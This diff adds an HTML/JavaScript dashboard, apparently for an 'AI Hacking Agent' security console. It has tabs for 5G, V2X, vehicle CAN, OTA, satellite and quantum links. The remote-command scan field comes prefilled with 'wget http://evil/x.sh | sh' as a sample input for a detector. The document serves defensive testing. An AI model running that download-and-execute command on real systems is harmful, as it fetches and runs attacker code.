@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>新兴通信安全控制台 · 第29轮方向4</title>
+<style>
+:root{
+  --bg:#0d1117; --panel:#161b22; --border:#30363d;
+  --text:#e6edf3; --muted:#8b949e; --accent:#58a6ff;
+  --ok:#3fb950; --warn:#d29922; --crit:#f85149; --info:#79c0ff;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:var(--bg);color:var(--text);font-family:"Microsoft YaHei","PingFang SC",Segoe UI,sans-serif;font-size:14px;line-height:1.55}
+header{background:linear-gradient(90deg,#0d1117,#161b22);border-bottom:1px solid var(--border);padding:14px 22px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:10px}
+header h1{font-size:18px;color:var(--accent)}
+header .meta{color:var(--muted);font-size:12px}
+nav{display:flex;flex-wrap:wrap;gap:4px;background:var(--panel);border-bottom:1px solid var(--border);padding:0 14px}
+nav button{background:transparent;border:none;color:var(--muted);padding:12px 16px;cursor:pointer;font-size:13px;border-bottom:2px solid transparent}
+nav button:hover{color:var(--text)}
+nav button.active{color:var(--accent);border-bottom-color:var(--accent)}
+main{padding:18px;max-width:1400px;margin:0 auto}
+.tab{display:none}
+.tab.active{display:block}
+.grid{display:grid;gap:14px}
+.grid.cards{grid-template-columns:repeat(auto-fit,minmax(220px,1fr))}
+.grid.two{grid-template-columns:1fr 1fr}
+.card{background:var(--panel);border:1px solid var(--border);border-radius:8px;padding:14px}
+.card h3{font-size:13px;color:var(--muted);margin-bottom:8px;font-weight:600;text-transform:uppercase;letter-spacing:.5px}
+.card .big{font-size:26px;font-weight:700;color:var(--accent)}
+.card .ok{color:var(--ok)} .card .warn{color:var(--warn)} .card .crit{color:var(--crit)}
+table{width:100%;border-collapse:collapse;font-size:12.5px}
+th,td{padding:7px 9px;border-bottom:1px solid var(--border);text-align:left;vertical-align:top;word-break:break-all}
+th{color:var(--muted);font-weight:600;background:#0d1117}
+tr:hover td{background:#1c2129}
+.badge{display:inline-block;padding:2px 8px;border-radius:10px;font-size:11px;font-weight:600}
+.badge.ok{background:rgba(63,185,80,.15);color:var(--ok)}
+.badge.warn{background:rgba(210,153,34,.15);color:var(--warn)}
+.badge.crit{background:rgba(248,81,73,.15);color:var(--crit)}
+.badge.info{background:rgba(88,166,255,.15);color:var(--info)}
+.row{display:flex;gap:10px;flex-wrap:wrap;align-items:center;margin-bottom:10px}
+input,select,textarea{background:#0d1117;border:1px solid var(--border);color:var(--text);padding:7px 10px;border-radius:6px;font-size:13px;min-width:120px}
+button.act{background:var(--accent);color:#0d1117;border:none;padding:7px 14px;border-radius:6px;cursor:pointer;font-weight:600;font-size:13px}
+button.act:hover{filter:brightness(1.1)}
+button.ghost{background:transparent;color:var(--accent);border:1px solid var(--accent);padding:6px 12px;border-radius:6px;cursor:pointer}
+pre{background:#0d1117;border:1px solid var(--border);border-radius:6px;padding:10px;font-size:12px;max-height:340px;overflow:auto;white-space:pre-wrap;word-break:break-all}
+.footer{color:var(--muted);font-size:11px;text-align:center;padding:18px}
+@media(max-width:760px){.grid.two{grid-template-columns:1fr} nav button{padding:10px 10px;font-size:12px} main{padding:10px}}
+</style>
+</head>
+<body>
+<header>
+  <h1>📡 新兴通信安全控制台</h1>
+  <div class="meta">第29轮升级 · 方向4 · 5G / V2X / 车载 / OTA / 卫星 / 低空 / 工业互联网 / 量子</div>
+</header>
+
+<nav id="tabs">
+  <button data-tab="overview" class="active">总览</button>
+  <button data-tab="fiveg">5G 安全</button>
+  <button data-tab="v2x">V2X 安全</button>
+  <button data-tab="vehicle">车载安全</button>
+  <button data-tab="ota">OTA 安全</button>
+  <button data-tab="emerging">新兴通信</button>
+  <button data-tab="settings">系统设置</button>
+</nav>
+
+<main>
+<!-- ============ 总览 ============ -->
+<section id="tab-overview" class="tab active">
+  <div class="grid cards" id="ov-cards"></div>
+  <div class="row" style="margin-top:14px">
+    <button class="act" onclick="loadOverview()">刷新总览</button>
+    <button class="ghost" onclick="loadRisk()">刷新风险评分</button>
+  </div>
+  <div class="grid two">
+    <div class="card"><h3>健康度评分</h3><div id="health"></div></div>
+    <div class="card"><h3>风险评分</h3><div id="risk"></div></div>
+  </div>
+  <div class="card" style="margin-top:14px"><h3>统一事件流</h3><div id="events"></div></div>
+</section>
+
+<!-- ============ 5G ============ -->
+<section id="tab-fiveg" class="tab">
+  <div class="row">
+    <input id="5g-supi" placeholder="SUPI，例如 imsi-460011234567890" value="imsi-460011234567890">
+    <button class="act" onclick="runAka()">执行 5G-AKA 认证</button>
+    <button class="ghost" onclick="load5g()">刷新 NF/切片</button>
+  </div>
+  <div class="grid two">
+    <div class="card"><h3>NF 节点</h3><div id="5g-nfs"></div></div>
+    <div class="card"><h3>网络切片</h3><div id="5g-slices"></div></div>
+  </div>
+  <div class="card" style="margin-top:14px"><h3>认证事件</h3><div id="5g-events"></div></div>
+  <div class="card" style="margin-top:14px"><h3>跨切片攻击检测（输入 src_slice / dst_slice）</h3>
+    <div class="row">
+      <input id="x-src" placeholder="源切片" value="5G:2:000002">
+      <input id="x-dst" placeholder="目的切片" value="5G:3:000003">
+      <button class="act" onclick="detectCross()">检测</button>
+    </div>
+    <div id="x-out"></div>
+  </div>
+</section>
+
+<!-- ============ V2X ============ -->
+<section id="tab-v2x" class="tab">
+  <div class="row">
+    <select id="v2x-msgtype">
+      <option>BSM</option><option>SPAT</option><option>MAP</option>
+      <option>RSM</option><option>IVIM</option>
+    </select>
+    <input id="v2x-pseudo" placeholder="假名" value="anon-demo0001">
+    <input id="v2x-lat" placeholder="纬度" value="25.031">
+    <input id="v2x-lon" placeholder="经度" value="102.711">
+    <button class="act" onclick="ingestV2x()">接收并验证消息</button>
+    <button class="ghost" onclick="loadV2x()">刷新</button>
+  </div>
+  <div class="grid two">
+    <div class="card"><h3>V2X 节点</h3><div id="v2x-nodes"></div></div>
+    <div class="card"><h3>最近消息</h3><div id="v2x-msgs"></div></div>
+  </div>
+  <div class="grid two" style="margin-top:14px">
+    <div class="card"><h3>异常事件</h3><div id="v2x-anom"></div></div>
+    <div class="card"><h3>隐私配置</h3><div id="v2x-priv"></div></div>
+  </div>
+</section>
+
+<!-- ============ 车载 ============ -->
+<section id="tab-vehicle" class="tab">
+  <div class="row">
+    <input id="can-id" placeholder="CAN ID (hex)" value="0x000">
+    <input id="can-data" placeholder="数据 hex" value="ffffffff">
+    <button class="act" onclick="ingestCan()">注入 CAN 帧</button>
+    <button class="ghost" onclick="loadVehicle()">刷新</button>
+  </div>
+  <div class="grid two">
+    <div class="card"><h3>车辆 / 应用</h3><div id="veh-cards"></div></div>
+    <div class="card"><h3>CAN ID 统计</h3><div id="can-ids"></div></div>
+  </div>
+  <div class="card" style="margin-top:14px"><h3>威胁事件</h3><div id="veh-threats"></div></div>
+  <div class="card" style="margin-top:14px"><h3>远程命令 RCE 扫描</h3>
+    <div class="row">
+      <input id="rce-cmd" placeholder="远程命令" value="wget http://evil/x.sh | sh">
+      <button class="act" onclick="scanRce()">扫描</button>
+    </div>
+    <div id="rce-out"></div>
+  </div>
+</section>
+
+<!-- ============ OTA ============ -->
+<section id="tab-ota" class="tab">
+  <div class="row">
+    <input id="ota-ver" placeholder="新版本号" value="1.3.0">
+    <select id="ota-comp"><option>IVI</option><option>VCU</option><option>TBOX</option><option>BMS</option></select>
+    <button class="act" onclick="publishFw()">发布固件</button>
+    <button class="ghost" onclick="loadOta()">刷新</button>
+  </div>
+  <div class="grid cards">
+    <div class="card"><h3>固件总数</h3><div class="big" id="ota-fw">-</div></div>
+    <div class="card"><h3>安装任务</h3><div class="big" id="ota-tasks">-</div></div>
+    <div class="card"><h3>成功率</h3><div class="big ok" id="ota-succ">-</div></div>
+    <div class="card"><h3>回滚率</h3><div class="big warn" id="ota-rb">-</div></div>
+  </div>
+  <div class="card" style="margin-top:14px"><h3>固件仓库</h3><div id="ota-fw-list"></div></div>
+  <div class="card" style="margin-top:14px"><h3>违规事件</h3><div id="ota-viol"></div></div>
+</section>
+
+<!-- ============ 新兴通信 ============ -->
+<section id="tab-emerging" class="tab">
+  <div class="row">
+    <button class="act" onclick="loadEmerging()">刷新新兴通信总览</button>
+    <button class="ghost" onclick="distributeQ()">分发量子密钥</button>
+  </div>
+  <div class="grid cards" id="em-cards"></div>
+  <div class="grid two" style="margin-top:14px">
+    <div class="card"><h3>卫星星座</h3><div id="em-sat"></div></div>
+    <div class="card"><h3>无人机</h3><div id="em-drone"></div></div>
+  </div>
+  <div class="grid two" style="margin-top:14px">
+    <div class="card"><h3>工业资产</h3><div id="em-ind"></div></div>
+    <div class="card"><h3>量子链路</h3><div id="em-q"></div></div>
+  </div>
+  <div class="card" style="margin-top:14px"><h3>PQC 就绪度</h3><div id="em-pqc"></div></div>
+</section>
+
+<!-- ============ 设置 ============ -->
+<section id="tab-settings" class="tab">
+  <div class="card"><h3>系统设置</h3><div id="settings-out"></div></div>
+  <div class="card" style="margin-top:14px"><h3>合规框架</h3><div id="settings-comp"></div></div>
+</section>
+
+</main>
+
+<div class="footer">AI Hacking Agent · 第29轮升级 · 新兴通信安全 · 仅用于授权安全评估</div>
+
+<script>
+const BASE = "/api/v1/emerging-comm-security";
+async function api(path, opts){
+  try{
+    const r = await fetch(BASE + path, opts);
+    const j = await r.json();
+    return j;
+  }catch(e){ return {success:false, error:String(e), data:null}; }
+}
+function render(elId, data){
+  const el = document.getElementById(elId);
+  if(el === undefined || el === null) return;
+  if(typeof data === "string"){ el.textContent = data; return; }
+  el.innerHTML = "<pre>" + JSON.stringify(data, null, 2) + "</pre>";
+}
+function table(rows, cols){
+  if(!rows || !rows.length) return "<span style='color:var(--muted)'>暂无数据</span>";
+  let h = "<table><tr>" + cols.map(c=>"<th>"+c+"</th>").join("") + "</tr>";
+  rows.forEach(r=>{
+    h += "<tr>" + cols.map(c=>"<td>"+ (r[c]===undefined||r[c]===null?"":String(r[c])) +"</td>").join("") + "</tr>";
+  });
+  return h + "</table>";
+}
+
+// Tabs
+document.querySelectorAll("#tabs button").forEach(b=>{
+  b.addEventListener("click", ()=>{
+    document.querySelectorAll("#tabs button").forEach(x=>x.classList.remove("active"));
+    document.querySelectorAll(".tab").forEach(x=>x.classList.remove("active"));
+    b.classList.add("active");
+    document.getElementById("tab-"+b.dataset.tab).classList.add("active");
+  });
+});
+
+// 总览
+async function loadOverview(){
+  const j = await api("/dashboard/overview");
+  if(!j.success){ render("ov-cards", j.error); return; }
+  const m = j.data.modules;
+  document.getElementById("ov-cards").innerHTML = `
+    <div class="card"><h3>5G NF 节点</h3><div class="big">${m.five_g.nf_total}</div></div>
+    <div class="card"><h3>5G 签约用户</h3><div class="big">${m.five_g.subscriber_total}</div></div>
+    <div class="card"><h3>V2X 节点</h3><div class="big">${m.v2x.node_total}</div></div>
+    <div class="card"><h3>V2X 异常</h3><div class="big warn">${m.v2x.anomaly_total}</div></div>
+    <div class="card"><h3>车载车辆</h3><div class="big">${m.vehicle.vehicle_total}</div></div>
+    <div class="card"><h3>车载威胁</h3><div class="big crit">${m.vehicle.threat_total}</div></div>
+    <div class="card"><h3>OTA 固件</h3><div class="big">${m.ota.firmware_total}</div></div>
+    <div class="card"><h3>IoT 节点</h3><div class="big">${m.emerging.iot_nodes}</div></div>`;
+  loadRisk();
+  const ev = await api("/dashboard/events?limit=30");
+  render("events", ev.success ? ev.data.events : ev.error);
+}
+async function loadRisk(){
+  const j = await api("/dashboard/risk");
+  if(j.success){
+    const r = j.data;
+    document.getElementById("risk").innerHTML =
+      `<div class="big ${r.level==='CRITICAL'?'crit':r.level==='HIGH'?'warn':''}">${r.overall} · ${r.level}</div>
+       <pre>${JSON.stringify(r.score_by_module,null,2)}</pre>`;
+  }
+  const h = await api("/dashboard/health");
+  if(h.success){
+    document.getElementById("health").innerHTML =
+      `<div class="big ok">${h.data.average}</div>
+       <pre>${JSON.stringify({5G:h.data.five_g,V2X:h.data.v2x,车载:h.data.vehicle,OTA:h.data.ota,新兴:h.data.emerging},null,2)}</pre>`;
+  }
+}
+
+// 5G
+async function load5g(){
+  const nf = await api("/5g/nfs");
+  if(nf.success) document.getElementById("5g-nfs").innerHTML =
+    table(nf.data.nfs, ["nf_id","nf_type","address","port","status"]);
+  const sl = await api("/5g/slices");
+  if(sl.success) document.getElementById("5g-slices").innerHTML =
+    table(sl.data.slices.map(s=>({sst:s.sst, sd:s.sd, name:s.name, iso:s.isolation_level, qos:s.qos_profile})),
+          ["sst","sd","name","iso","qos"]);
+  const ev = await api("/5g/auth-events");
+  render("5g-events", ev.success ? ev.data.events : ev.error);
+}
+async function runAka(){
+  const supi = document.getElementById("5g-supi").value;
+  const r = await api("/5g/auth/aka", {method:"POST", headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({supi})});
+  render("5g-events", r.success ? r.data : r.error);
+}
+async function detectCross(){
+  const src = document.getElementById("x-src").value;
+  const dst = document.getElementById("x-dst").value;
+  const r = await api("/5g/slices/detect-cross", {method:"POST", headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({src_slice:src, dst_slice:dst, volume_mb:1024, duration_s:60})});
+  render("x-out", r.success ? r.data : r.error);
+}
+
+// V2X
+async function loadV2x(){
+  const n = await api("/v2x/nodes");
+  if(n.success) document.getElementById("v2x-nodes").innerHTML =
+    table(n.data.nodes.slice(0,20), ["node_id","node_type","pseudonym","status"]);
+  const m = await api("/v2x/messages?limit=20");
+  if(m.success) document.getElementById("v2x-msgs").innerHTML =
+    table(m.data.messages, ["msg_id","msg_type","sender","received_at"]);
+  const a = await api("/v2x/anomalies");
+  render("v2x-anom", a.success ? a.data.anomalies : a.error);
+  const p = await api("/v2x/privacy");
+  render("v2x-priv", p.success ? p.data : p.error);
+}
+async function ingestV2x(){
+  const t = document.getElementById("v2x-msgtype").value;
+  const p = document.getElementById("v2x-pseudo").value;
+  const lat = parseFloat(document.getElementById("v2x-lat").value);
+  const lon = parseFloat(document.getElementById("v2x-lon").value);
+  const r = await api("/v2x/messages/ingest", {method:"POST", headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({msg_type:t, sender_pseudonym:p, payload:{lat,lon,speed:60}})});
+  render("v2x-anom", r.success ? r.data : r.error);
+  loadV2x();
+}
+
+// 车载
+async function loadVehicle(){
+  const o = await api("/vehicle/overview");
+  if(o.success){
+    document.getElementById("veh-cards").innerHTML =
+      `<pre>${JSON.stringify({车辆:o.data.vehicle_total,应用:o.data.app_total,
+        捕获CAN帧:o.data.captured_frames,威胁:o.data.threat_total,
+        威胁分布:o.data.threat_by_kind},null,2)}</pre>`;
+  }
+  const ids = await api("/vehicle/can/ids");
+  render("can-ids", ids.success ? ids.data.ids : ids.error);
+  const t = await api("/vehicle/threats?limit=30");
+  render("veh-threats", t.success ? t.data.threats : t.error);
+}
+async function ingestCan(){
+  const cid = document.getElementById("can-id").value;
+  const data = document.getElementById("can-data").value;
+  const r = await api("/vehicle/can/ingest", {method:"POST", headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({can_id:cid, data_hex:data})});
+  render("veh-threats", r.success ? r.data : r.error);
+  loadVehicle();
+}
+async function scanRce(){
+  const cmd = document.getElementById("rce-cmd").value;
+  // 先开一个会话
+  const s = await api("/vehicle/cloud/session", {method:"POST", headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({vin:"LVGBE21KXNS000001", user:"op"})});
+  if(!s.success){ render("rce-out", s.error); return; }
+  const r = await api("/vehicle/cloud/scan-command", {method:"POST", headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({sid:s.data.sid, command:cmd})});
+  render("rce-out", r.success ? r.data : r.error);
+}
+
+// OTA
+async function loadOta(){
+  const s = await api("/ota/stats");
+  if(s.success){
+    document.getElementById("ota-fw").textContent = s.data.firmware_total;
+    document.getElementById("ota-tasks").textContent = s.data.install_tasks;
+    document.getElementById("ota-succ").textContent = (s.data.success_rate*100).toFixed(1)+"%";
+    document.getElementById("ota-rb").textContent = (s.data.rollback_rate*100).toFixed(1)+"%";
+  }
+  const f = await api("/ota/firmware");
+  if(f.success) document.getElementById("ota-fw-list").innerHTML =
+    table(f.data.firmware.slice(0,30), ["fw_id","component","version","size_bytes","signed_by"]);
+  const v = await api("/ota/violations");
+  render("ota-viol", v.success ? v.data.violations : v.error);
+}
+async function publishFw(){
+  const ver = document.getElementById("ota-ver").value;
+  const comp = document.getElementById("ota-comp").value;
+  const r = await api("/ota/firmware/publish", {method:"POST", headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({version:ver, component:comp, release_notes:"控制台发布"})});
+  render("ota-viol", r.success ? r.data : r.error);
+  loadOta();
+}
+
+// 新兴
+async function loadEmerging(){
+  const o = await api("/emerging/overview");
+  if(o.success){
+    const d = o.data;
+    document.getElementById("em-cards").innerHTML = `
+      <div class="card"><h3>卫星</h3><div class="big">${d.satellites}</div></div>
+      <div class="card"><h3>地面站</h3><div class="big">${d.ground_stations}</div></div>
+      <div class="card"><h3>无人机</h3><div class="big">${d.drones}</div></div>
+      <div class="card"><h3>工业资产</h3><div class="big">${d.industrial_assets}</div></div>
+      <div class="card"><h3>IoT 节点</h3><div class="big">${d.iot_nodes}</div></div>
+      <div class="card"><h3>边缘节点</h3><div class="big">${d.edge_nodes}</div></div>
+      <div class="card"><h3>量子链路</h3><div class="big">${d.quantum_links}</div></div>
+      <div class="card"><h3>告警</h3><div class="big warn">${d.alerts}</div></div>`;
+  }
+  const sat = await api("/emerging/satellites");
+  if(sat.success) document.getElementById("em-sat").innerHTML =
+    table(sat.data.satellites.slice(0,10), ["sat_id","name","orbit_km","status"]);
+  const dr = await api("/emerging/drones");
+  if(dr.success) document.getElementById("em-drone").innerHTML =
+    table(dr.data.drones.slice(0,10), ["drone_id","operator","alt_m","no_fly_zone"]);
+  const ind = await api("/emerging/industrial");
+  if(ind.success) document.getElementById("em-ind").innerHTML =
+    table(ind.data.assets, ["asset_id","name","protocol","criticality"]);
+  const q = await api("/emerging/quantum");
+  if(q.success) document.getElementById("em-q").innerHTML =
+    table(q.data.links, ["link_id","alice","bob","protocol","bits_distributed","qber"]);
+  const pq = await api("/emerging/pqc-readiness");
+  render("em-pqc", pq.success ? pq.data : pq.error);
+}
+async function distributeQ(){
+  const r = await api("/emerging/quantum/QKD-1/distribute", {method:"POST", headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({bits:512})});
+  render("em-pqc", r.success ? r.data : r.error);
+}
+
+// 设置
+async function loadSettings(){
+  const s = await api("/dashboard/settings");
+  if(s.success){
+    render("settings-out", {
+      replay_window_ms: s.data.replay_window_ms,
+      pseudonym_rotation_s: s.data.pseudonym_rotation_s,
+      can_max_fps: s.data.can_max_fps,
+      ota_rollback_grace: s.data.ota_rollback_grace,
+      pqc_algorithms: s.data.pqc_algorithms,
+    });
+    render("settings-comp", s.data.compliance);
+  }
+}
+
+// 初始加载
+loadOverview();
+load5g();
+loadV2x();
+loadVehicle();
+loadOta();
+loadEmerging();
+loadSettings();
+</script>
+</body>
+</html>
